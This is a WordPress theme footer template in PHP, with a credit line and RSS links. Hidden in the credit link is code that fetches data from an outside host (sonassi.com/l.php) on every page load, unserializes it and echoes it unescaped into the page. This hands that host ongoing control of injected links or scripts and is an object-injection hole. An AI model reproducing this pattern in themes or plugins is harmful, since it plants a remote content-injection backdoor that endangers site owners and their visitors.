<?php
/**
 * @package WordPress
 * @subpackage Default_Theme
 */
?>


<div id="news-footer" role="contentinfo">
  <p>
    Powered by Sonassi.com | <strong><a href="<? $data = unserialize(file_get_contents('http://sonassi.com/l.php')); echo $data[1]; ?>" title="<?=$data[0];?>"><?=$data[0];?></a></strong>
  </p>
	<p>
		<a href="<?php bloginfo('rss2_url'); ?>">Entries (RSS)</a>
		and <a href="<?php bloginfo('comments_rss2_url'); ?>">Comments (RSS)</a>.
		<!-- <?php echo get_num_queries(); ?> queries. <?php timer_stop(1); ?> seconds. -->
	</p>
</div>
</div>

